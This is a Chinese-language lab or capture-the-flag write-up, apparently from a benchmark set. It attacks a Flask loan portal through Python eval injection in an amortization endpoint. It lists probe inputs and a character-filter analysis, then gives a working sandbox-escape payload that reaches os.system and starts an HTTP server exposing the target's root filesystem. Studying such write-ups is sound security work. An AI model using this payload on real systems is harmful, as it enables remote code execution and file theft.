# xben-023-24 · 探索记录

对应题解：[`xben-023-24.md`](./xben-023-24.md)

## 目标与起点

`10.0.175.49:80`，Flask 贷款门户。登录页注释 `<!-- TODO: Delete the testing account (test:test). -->`，
`test:test` 登录后进入 `/home`，页面有 `/profile`、`/loan_details`。

## 第一阶段：先排除老朋友

| 尝试 | 结果 |
| --- | --- |
| `/profile?user_id=0..3`、`/loan_details?user_id=` | 全部返回同一份 John Doe 数据（参数被忽略） |
| `name={{7*7}}` 存进 profile | 原样显示 `{{7*7}}`，不是模板 |
| session `{'user_id': 1}` + 常见 secret（900 个候选） | 签名不匹配，无法伪造 |
| `/login` 注入（`'-- -`、`' OR 1=1-- -`） | 一律 200，无成功态 |
| profile 姓名里塞 `'`（`O'Brien`） | 正常保存，无 SQL 报错 |

## 第二阶段：`/loan_details` 的 iframe 指向新接口

页面 JS：`$('#amortizationIframe').attr('src', '/amortization?term=60')`。

| term | 输出 |
| --- | --- |
| `60` | 10064 字节（60 行） |
| `60+1` | 10218（61 行） |
| `60-1` | 9910（59 行） |
| `0x3c` | 10064（= 60，**说明是 eval**） |
| `60.5` / `1e3` | 500（float 给 range） |

## 第三阶段：字符过滤与沙箱探测

| 输入 | 结果 |
| --- | --- |
| `60{60` / `60}60` / `60%60` | 400 `GET parameter 'term' contains forbidden characters.` |
| `_`、`[`、`]`、`'`、`(`、`)`、`.`、`/`、`*`、`-`、`+` | 不触发 400（只是 eval 报错 500 或正常 200） |
| `(1 if ().__class__.__base__.__subclasses__() else 0)` | 200（返回 60 行 → 表达式为真） |

即：**只挡 `{` `}` `%`，没有裁 builtins、没有拦 dunder**。

## 第四阶段：拿 RCE

列表推导式 `[c for c in ...]` 一律 500（沙箱或过滤器干预），于是改用「下标 + 等值比较」扫描：

```text
().__class__.__base__.__subclasses__()[i].__name__ == '_wrap_close'
i = 133 或 217 时返回 986 字节（60 行）= True
```

用 133 执行：

```text
( ().__class__.__base__.__subclasses__()[133].__init__.__globals__['system'](
    'setsid python3 -m http.server 8899 --directory / >/dev/null 2>&1 &'), 60 )[1]
```

返回 60 行（200），随后 `http://<ip>:8899/` 列出根目录，`/flag` 即 flag
（`/flag.txt` 404）。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `{{7*7}}` 等模板注入 | 500/400 | `{` 被过滤；普通位置也只是原样输出 |
| 列表推导式取 `_wrap_close` | 500 | 同环境下 `[x for x in [1]]` 也 500 |
| 伪造 session | 失败 | 906 个候选 secret 无匹配 |
| 写文件到 docroot | 未尝试成功 | 直接起静态服务更省事 |

## 这次真正的收获

1. **`0x3c` 是识别 `eval` 的试纸**：能算出 60 就说明不是 `int()`。
2. **「执行代码 + 必须返回 int」用 `(expr, 60)[1]`**，比 `or 60` 稳（后者在 expr 返回空串时会失败）。
3. **过滤表要逐字符画**：这里只挡三个字符，等于完全开放。
4. **沙箱里列表推导式可能不可用，但下标可用**——扫描 300 次比构造语法技巧便宜。
